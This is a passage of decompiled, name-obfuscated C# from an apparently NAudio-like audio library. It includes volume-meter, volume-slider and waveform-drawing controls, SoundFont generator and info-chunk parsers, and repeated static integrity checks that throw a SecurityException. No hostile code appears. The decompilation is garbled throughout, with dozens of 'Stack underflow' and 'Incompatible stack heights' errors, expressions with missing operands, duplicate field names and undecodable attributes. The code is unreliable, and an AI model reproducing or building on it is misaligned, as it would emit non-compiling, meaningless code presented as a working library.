		}

		[DefaultValue(18.0)]
		public float MaxDb
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0001)/*Error near IL_0007: Stack underflow*/)._0003;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0001)/*Error near IL_0009: Stack underflow*/)._0003 = (float)/*Error near IL_0009: Stack underflow*/;
			}
		}

		[DefaultValue(/*Could not decode attribute arguments.*/)]
		public Orientation Orientation
		{
			[CompilerGenerated]
			get
			{
				//IL_0002: Unknown result type (might be due to invalid IL or missing references)
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0001)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_0004: Unknown result type (might be due to invalid IL or missing references)
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000d: Unknown result type (might be due to invalid IL or missing references)
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0001)/*Error near IL_0009: Stack underflow*/).m__0001 = (Orientation)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0001()
		{
			((Control)this).SetStyle((ControlStyles)139266, true);
			MinDb = -60f;
			MaxDb = 18f;
			Amplitude = 0f;
			Orientation = (Orientation)1;
			this._0001 = new Container();
			((Control)this).OnForeColorChanged(EventArgs.Empty);
		}

		protected override void _0001(EventArgs _0002)
		{
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Expected O, but got Unknown
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 2
			//IL_002d: Incompatible stack heights: 0 vs 1
			_ = _0017_0002._007E_001A_0005;
			/*Error near IL_002d: Stack underflow*/((object)/*Error near IL_002d: Stack underflow*/);
			SolidBrush val = new SolidBrush((Color)/*Error near IL_0010: Stack underflow*/);
			((_0001)/*Error near IL_0015: Stack underflow*/).m__0001 = (Brush)val;
			_001F_0002._0081_0005(this, _0002);
		}

		protected override void _0001(PaintEventArgs _0002)
		{
			//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
			//IL_0117: Incompatible stack heights: 0 vs 3
			//IL_0121: Incompatible stack heights: 0 vs 1
			//IL_012b: Incompatible stack heights: 0 vs 1
			_ = _000F_0002._007E_000E_0005;
			_ = _009F._007E_0095_0004;
			/*Error near IL_0121: Stack underflow*/((object)/*Error near IL_0121: Stack underflow*/);
			_000E_0002._0008_0005();
			int num = global::_001A._0012_0003(this) - 1;
			int num2 = global::_001A._0013_0003(this);
			/*Error near IL_003f: Stack underflow*/((object)/*Error near IL_003f: Stack underflow*/, (Pen)/*Error near IL_003f: Stack underflow*/, 0, 0, num, num2 - 1);
			double num3 = 20.0 * global::_0015._009C_0002(this._0001);
			if (num3 < (double)MinDb)
			{
				num3 = MinDb;
			}
			if (num3 > (double)MaxDb)
			{
				num3 = MaxDb;
			}
			double num4 = (num3 - (double)MinDb) / (double)(MaxDb - MinDb);
			int num5 = global::_001A._0012_0003(this) - 2;
			int num6 = global::_001A._0013_0003(this) - 2;
			if ((int)Orientation == 0)
			{
				num5 = (int)((double)num5 * num4);
				_0002_0002._007E_0099_0004(_009F._007E_0095_0004(_0002), this.m__0001, 1, 1, num5, num6);
			}
			else
			{
				num6 = (int)((double)num6 * num4);
				_0002_0002._007E_0099_0004(_009F._007E_0095_0004(_0002), this.m__0001, 1, global::_001A._0013_0003(this) - 1 - num6, num5, num6);
			}
		}

		protected override void _0001(bool _0002)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((_0001)/*Error near IL_000b: Stack underflow*/)._0001 != null)
			{
				_ = global::_0008._007E_0098;
				IContainer container = ((_0001)/*Error near IL_0019: Stack underflow*/)._0001;
				/*Error near IL_001e: Stack underflow*/(container);
			}
			global::_0005._0088(this, _0002);
		}

		static _0001()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0015
{
	internal sealed class _0005 : UserControl
	{
		private Container m__0001;

		internal float _0001 = 1f;

		internal float _0002 = -48f;

		[CompilerGenerated]
		private EventHandler m__0001;

		[DefaultValue(1f)]
		public float Volume
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_0007: Invalid comparison between Unknown and F4
				//IL_0017: Invalid comparison between Unknown and F4
				//IL_005b: Incompatible stack heights: 0 vs 1
				//IL_0062: Incompatible stack heights: 0 vs 1
				if (!((float)/*Error near IL_0009: Stack underflow*/ >= 0f))
				{
					value = 0f;
				}
				if (!((float)/*Error near IL_0019: Stack underflow*/ <= 1f))
				{
					value = 1f;
				}
				if (this._0001 != value)
				{
					this._0001 = value;
					if (this.m__0001 != null)
					{
						_0015_0002._007E_0017_0005(this.m__0001, this, EventArgs.Empty);
					}
					global::_0008._009D(this);
				}
			}
		}

		public event EventHandler VolumeChanged
		{
			[CompilerGenerated]
			add
			{
				//IL_0032: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				EventHandler eventHandler = ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001;
				EventHandler eventHandler2;
				do
				{
					eventHandler2 = (EventHandler)/*Error near IL_000c: Stack underflow*/;
					EventHandler value2 = (EventHandler)_0005_0002._009F_0004(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this.m__0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_0032: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				EventHandler eventHandler = ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001;
				EventHandler eventHandler2;
				do
				{
					eventHandler2 = (EventHandler)/*Error near IL_000c: Stack underflow*/;
					EventHandler value2 = (EventHandler)_0005_0002._0001_0005(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this.m__0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		public _0005()
		{
			global::_0011._0018._0001(this);
		}

		protected override void _0001(bool _0002)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((_0005)/*Error near IL_000b: Stack underflow*/).m__0001 != null)
			{
				_ = global::_0008._007E_009B;
				Container container = ((_0005)/*Error near IL_0019: Stack underflow*/).m__0001;
				/*Error near IL_001e: Stack underflow*/(container);
			}
			global::_0005._0089(this, _0002);
		}

		protected override void _0001(PaintEventArgs _0002)
		{
			//IL_0125: Unknown result type (might be due to invalid IL or missing references)
			//IL_012a: Incompatible stack heights: 0 vs 1
			//IL_0136: Incompatible stack heights: 0 vs 2
			new StringFormat();
			StringFormat val = (StringFormat)/*Error near IL_0130: Stack underflow*/;
			_ = _0006_0002._007E_0002_0005;
			/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/, (StringAlignment)1);
			_0006_0002._007E_0003_0005(val, (StringAlignment)1);
			_000F_0002._007E_000E_0005(_009F._007E_0095_0004(_0002), _000E_0002._0008_0005(), 0, 0, global::_001A._0012_0003(this) - 1, global::_001A._0013_0003(this) - 1);
			float num = 20f * (float)global::_0015._009C_0002(this._0001);
			float num2 = 1f - num / this._0002;
			_0002_0002._007E_0099_0004(_009F._007E_0095_0004(_0002), _0007_0002._0006_0005(), 1, 1, (int)((float)(global::_001A._0012_0003(this) - 2) * num2), global::_001A._0013_0003(this) - 2);
			string text = _0008_0002._0007_0005(_0080._0014._0001(107395051), num);
			_0013_0002._007E_0015_0005(_009F._007E_0095_0004(_0002), text, _0010_0002._007E_0010_0005(this), _0007_0002._0005_0005(), _0012_0002._0014_0005(_0011_0002._0011_0005(this)), val);
		}

		protected override void _0001(MouseEventArgs _0002)
		{
			//IL_000e: Invalid comparison between Unknown and I4
			//IL_0030: Incompatible stack heights: 0 vs 2
			//IL_0032: Unknown result type (might be due to invalid IL or missing references)
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 1
			_ = _0014_0002._007E_0016_0005;
			/*Error near IL_0037: Stack underflow*/((object)/*Error near IL_0037: Stack underflow*/);
			if ((int)/*Error near IL_0010: Stack underflow*/ == 1048576)
			{
				int num = global::_001A._007E_0014_0003(_0002);
				global::_0011._0018._0001((_0005)/*Error near IL_0022: Stack underflow*/, num);
			}
			_0004_0002._009C_0004(this, _0002);
		}

		protected override void _0002(MouseEventArgs _0002)
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 2
			//IL_0028: Incompatible stack heights: 0 vs 1
			_ = global::_001A._007E_0014_0003;
			/*Error near IL_0028: Stack underflow*/((object)/*Error near IL_0028: Stack underflow*/);
			global::_0011._0018._0001((_0005)/*Error near IL_0010: Stack underflow*/, (int)/*Error near IL_0010: Stack underflow*/);
			_0004_0002._009E_0004(this, _0002);
		}
	}
}
namespace _0018
{
	internal sealed class _0004 : Control
	{
		private Pen m__0001;

		internal List<float> _0001 = new List<float>(1000);

		internal int _0001;

		internal int _0002;

		internal IContainer _0001;

		public _0004()
		{
			((Control)this).SetStyle((ControlStyles)139266, true);
			this._0001 = new Container();
			((Control)this).OnForeColorChanged(EventArgs.Empty);
			((Control)this).OnResize(EventArgs.Empty);
		}

		protected override void _0001(EventArgs _0002)
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 2
			//IL_0028: Incompatible stack heights: 0 vs 1
			_ = global::_001A._0012_0003;
			/*Error near IL_0028: Stack underflow*/((object)/*Error near IL_0028: Stack underflow*/);
			((_0004)/*Error near IL_0010: Stack underflow*/)._0001 = (int)/*Error near IL_0010: Stack underflow*/;
			_001F_0002._0082_0005(this, _0002);
		}

		protected override void _0002(EventArgs _0002)
		{
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Expected O, but got Unknown
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 2
			//IL_002d: Incompatible stack heights: 0 vs 1
			_ = _0017_0002._007E_001A_0005;
			/*Error near IL_002d: Stack underflow*/((object)/*Error near IL_002d: Stack underflow*/);
			Pen val = new Pen((Color)/*Error near IL_0010: Stack underflow*/);
			((_0004)/*Error near IL_0015: Stack underflow*/).m__0001 = val;
			_001F_0002._0081_0005(this, _0002);
		}

		protected override void _0001(PaintEventArgs _0002)
		{
			//IL_008c: Incompatible stack heights: 0 vs 2
			//IL_0092: Incompatible stack heights: 0 vs 1
			_ = _0003_0002._009A_0004;
			/*Error near IL_009c: Stack underflow*/((object)/*Error near IL_009c: Stack underflow*/, (PaintEventArgs)/*Error near IL_009c: Stack underflow*/);
			for (int i = 0; i < global::_001A._0012_0003(this); i++)
			{
				float num = (float)global::_001A._0013_0003(this) * global::_0011._0018._0001(i - global::_001A._0012_0003(this) + this._0002, this);
				float num2 = ((float)global::_001A._0013_0003(this) - num) / 2f;
				_001D_0002._007E_007F_0005(_009F._007E_0095_0004(_0002), this.m__0001, i, num2, i, num2 + num);
			}
		}

		protected override void _0001(bool _0002)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((_0004)/*Error near IL_000b: Stack underflow*/)._0001 != null)
			{
				_ = global::_0008._007E_0098;
				IContainer container = ((_0004)/*Error near IL_0019: Stack underflow*/)._0001;
				/*Error near IL_001e: Stack underflow*/(container);
			}
			global::_0005._0088(this, _0002);
		}

		static _0004()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0007
{
	internal sealed class _0002 : UserControl
	{
		internal Container _0001;

		private global::_0006._0006 m__0001;

		private int m__0001 = 128;

		private long m__0001;

		private int m__0002;

		public global::_0006._0006 WaveStream
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0002)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_0048: Incompatible stack heights: 0 vs 1
				//IL_004b: Incompatible stack heights: 0 vs 1
				//IL_004e: Incompatible stack heights: 0 vs 1
				((_0002)/*Error near IL_0009: Stack underflow*/).m__0001 = (global::_0006._0006)/*Error near IL_0009: Stack underflow*/;
				if (((_0002)/*Error near IL_0010: Stack underflow*/).m__0001 != null)
				{
					m__0002 = this.m__0001.WaveFormat._0003 / 8 * this.m__0001.WaveFormat._0001;
				}
				global::_0008._009D(this);
			}
		}

		public int SamplesPerPixel
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0002)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_0017: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				//IL_001d: Incompatible stack heights: 0 vs 2
				((_0002)/*Error near IL_0009: Stack underflow*/).m__0001 = (int)/*Error near IL_0009: Stack underflow*/;
				_ = global::_0008._009D;
				/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
			}
		}

		public long StartPosition
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0002)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0002)/*Error near IL_0009: Stack underflow*/).m__0001 = (long)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0002()
		{
			this._0001 = new Container();
			((Control)this).set_DoubleBuffered(true);
		}

		protected override void _0001(bool _0002)
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((_0002)/*Error near IL_000b: Stack underflow*/)._0001 != null)
			{
				_ = global::_0008._007E_009B;
				Container container = ((_0002)/*Error near IL_0019: Stack underflow*/)._0001;
				/*Error near IL_001e: Stack underflow*/(container);
			}
			global::_0005._0089(this, _0002);
		}

		protected override void _0001(PaintEventArgs _0002)
		{
			//IL_017b: Incompatible stack heights: 0 vs 1
			//IL_0181: Incompatible stack heights: 0 vs 2
			if (((_0002)/*Error near IL_000a: Stack underflow*/).m__0001 != null)
			{
				_ = _007F_0002._007E_0083_0005;
				global::_0006._0006 obj = ((_0002)/*Error near IL_001e: Stack underflow*/).m__0001;
				/*Error near IL_018b: Stack underflow*/(obj, 0L);
				byte[] array = new byte[this.m__0001 * this.m__0002];
				_007F_0002._007E_0083_0005(this.m__0001, this.m__0001 + _0011_0002._007E_0012_0005(_0002).Left * this.m__0002 * this.m__0001);
				for (float num = _0011_0002._007E_0012_0005(_0002).X; num < (float)_0011_0002._007E_0012_0005(_0002).Right; num += 1f)
				{
					short num2 = 0;
					short num3 = 0;
					int num4 = _0082._007E_0006_0004(this.m__0001, array, 0, this.m__0001 * this.m__0002);
					if (num4 == 0)
					{
						break;
					}
					for (int i = 0; i < num4; i += 2)
					{
						short num5 = _0080_0002._0086_0005(array, i);
						if (num5 < num2)
						{
							num2 = num5;
						}
						if (num5 > num3)
						{
							num3 = num5;
						}
					}
					float num6 = ((float)num2 - -32768f) / 65535f;
					float num7 = ((float)num3 - -32768f) / 65535f;
					_001D_0002._007E_007F_0005(_009F._007E_0095_0004(_0002), _000E_0002._0008_0005(), num, (float)global::_001A._0013_0003(this) * num6, num, (float)global::_001A._0013_0003(this) * num7);
				}
			}
			_0003_0002._009A_0004(this, _0002);
		}
	}
}
namespace _0018
{
	internal sealed class _0005
	{
		internal GeneratorEnum _0001;

		internal ushort _0001;

		internal global::_0017._0002 _0001;

		internal _0080._0002 _0001;

		public GeneratorEnum GeneratorType
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0005)/*Error near IL_0009: Stack underflow*/)._0001 = (GeneratorEnum)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public ushort UInt16Amount
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0005)/*Error near IL_0009: Stack underflow*/)._0001 = (ushort)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public short Int16Amount
		{
			get
			{
				//IL_000a: Incompatible stack heights: 0 vs 1
				return (short)((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000c: Incompatible stack heights: 0 vs 1
				//IL_000f: Incompatible stack heights: 0 vs 1
				ushort num = (ushort)/*Error near IL_0005: Stack underflow*/;
				((_0005)/*Error near IL_000a: Stack underflow*/)._0001 = num;
			}
		}

		public byte LowByteAmount
		{
			get
			{
				//IL_0010: Incompatible stack heights: 0 vs 1
				return (byte)(((_0005)/*Error near IL_0007: Stack underflow*/)._0001 & 0xFFu);
			}
			set
			{
				//IL_0027: Incompatible stack heights: 0 vs 1
				//IL_002a: Incompatible stack heights: 0 vs 1
				//IL_002d: Incompatible stack heights: 0 vs 1
				ushort num = ((_0005)/*Error near IL_0009: Stack underflow*/)._0001;
				((_0005)/*Error near IL_0015: Stack underflow*/)._0001 = (ushort)(num & 0xFF00u);
				ushort num2 = this._0001;
				((_0005)/*Error near IL_0025: Stack underflow*/)._0001 = (ushort)(num2 + value);
			}
		}

		public byte HighByteAmount
		{
			get
			{
				//IL_0012: Incompatible stack heights: 0 vs 1
				return (byte)((((_0005)/*Error near IL_0007: Stack underflow*/)._0001 & 0xFF00) >> 8);
			}
			set
			{
				//IL_002a: Incompatible stack heights: 0 vs 1
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0030: Incompatible stack heights: 0 vs 1
				ushort num = ((_0005)/*Error near IL_0009: Stack underflow*/)._0001;
				((_0005)/*Error near IL_0015: Stack underflow*/)._0001 = (ushort)(num & 0xFFu);
				ushort num2 = this._0001;
				((_0005)/*Error near IL_0028: Stack underflow*/)._0001 = (ushort)(num2 + (ushort)(value << 8));
			}
		}

		public global::_0017._0002 Instrument
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0005)/*Error near IL_0009: Stack underflow*/)._0001 = (global::_0017._0002)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0080._0002 SampleHeader
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0005)/*Error near IL_0009: Stack underflow*/)._0001 = (_0080._0002)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public override string _0001()
		{
			//IL_007a: Incompatible stack heights: 0 vs 1
			//IL_0084: Incompatible stack heights: 0 vs 2
			//IL_0087: Incompatible stack heights: 0 vs 1
			if (((_0005)/*Error near IL_0007: Stack underflow*/)._0001 == GeneratorEnum.Instrument)
			{
				_ = _0008_0002._0007_0005;
				_0080._0014._0001(107395070);
				string text = ((_0005)/*Error near IL_001e: Stack underflow*/)._0001._0001;
				return /*Error near IL_0028: Stack underflow*/((string)/*Error near IL_0028: Stack underflow*/, text);
			}
			if (this._0001 == GeneratorEnum.SampleID)
			{
				return _0008_0002._0007_0005(_0080._0014._0001(107395037), this._0001);
			}
			return _009D._0093_0004(_0080._0014._0001(107395004), this._0001, this._0001);
		}

		static _0005()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0019
{
	internal sealed class _0001 : global::_0016._0002<global::_0018._0005>
	{
		public override int Length => 4;

		public global::_0018._0005[] Generators
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				((global::_0016._0002<global::_0018._0005>)/*Error near IL_0007: Stack underflow*/)._0001.ToArray();
				return (global::_0018._0005[])/*Error near IL_000a: Stack underflow*/;
			}
		}

		public override global::_0018._0005 _0001(BinaryReader _0002)
		{
			//IL_003a: Incompatible stack heights: 0 vs 1
			//IL_0040: Incompatible stack heights: 0 vs 1
			new global::_0018._0005();
			global::_0018._0005 obj = (global::_0018._0005)/*Error near IL_003d: Stack underflow*/;
			ushort num = _0081_0002._007E_0087_0005(_0002);
			((global::_0018._0005)/*Error near IL_0016: Stack underflow*/)._0001 = (GeneratorEnum)num;
			obj._0001 = _0081_0002._007E_0087_0005(_0002);
			base._0001.Add(obj);
			return obj;
		}

		public override void _0001(BinaryWriter _0002, global::_0018._0005 _0003)
		{
		}
	}
}
namespace _0016
{
	internal abstract class _0002<_0001>
	{
		protected internal List<_0001> _0001;

		public abstract int Length { get; }

		public _0001[] Data
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				((global::_0016._0002<_0001>)/*Error near IL_0007: Stack underflow*/)._0001.ToArray();
				return (_0001[])/*Error near IL_000a: Stack underflow*/;
			}
		}

		public _0002()
		{
			this._0001();
		}

		public abstract _0001 _0001(BinaryReader _0002);

		public abstract void _0001(BinaryWriter _0002, _0001 _0003);

		public void _0001()
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_0012: Incompatible stack heights: 0 vs 1
			new List<_0001>();
			((global::_0016._0002<_0001>)/*Error near IL_0009: Stack underflow*/)._0001 = (List<_0001>)/*Error near IL_0009: Stack underflow*/;
		}
	}
}
namespace _0013
{
	internal sealed class _0003
	{
		internal global::_0015._0006 _0001;

		internal string _0001;

		internal string _0002;

		internal string _0003;

		internal string _0004;

		internal string _0005;

		internal string _0006;

		internal string _0007;

		private string _0008;

		internal string _000E;

		internal global::_0015._0006 _0002;

		public global::_0015._0006 SoundFontVersion => ((_0003)/*Error near IL_0007: Stack underflow*/)._0001;

		public string WaveTableSoundEngine
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0001 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public string BankName
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0002 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public string DataROM
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0003;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0003 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public string CreationDate
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0004;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0004 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public string Author
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0005;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0005 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public string TargetProduct
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0006;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0006 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public string Copyright
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0007;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0007 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public string Comments
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0008;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0008 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public string Tools
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._000E;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._000E = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0015._0006 ROMVersion
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/)._0002 = (global::_0015._0006)/*Error near IL_0009: Stack underflow*/;
			}
		}

		internal _0003(global::_0002._0002 _0081_008F_0006)
		{
			bool flag = false;
			bool flag2 = false;
			bool flag3 = false;
			if (global::_0011._0018._0001(_0081_008F_0006) != _0080._0014._0001(107394947))
			{
				throw new InvalidDataException(_0080._0014._0001(107394970));
			}
			global::_0002._0002 obj;
			while ((obj = global::_0011._0018._0001(_0081_008F_0006)) != null)
			{
				string text = obj._0001;
				switch (global::_0011._0018._0001(text))
				{
				case 3349434627u:
					if (!(text == _0080._0014._0001(107394913)))
					{
						break;
					}
					flag = true;
					this._0001 = obj._0001<global::_0015._0006>((global::_0016._0002<global::_0015._0006>)new _001C._0003());
					continue;
				case 2408165810u:
					if (!(text == _0080._0014._0001(107394936)))
					{
						break;
					}
					flag2 = true;
					_0001 = global::_0011._0018._0001(obj);
					continue;
				case 186167360u:
					if (!(text == _0080._0014._0001(107394895)))
					{
						break;
					}
					flag3 = true;
					this._0002 = global::_0011._0018._0001(obj);
					continue;
				case 1286587406u:
					if (!(text == _0080._0014._0001(107394886)))
					{
						break;
					}
					_0003 = global::_0011._0018._0001(obj);
					continue;
				case 2337496513u:
					if (!(text == _0080._0014._0001(107394909)))
					{
						break;
					}
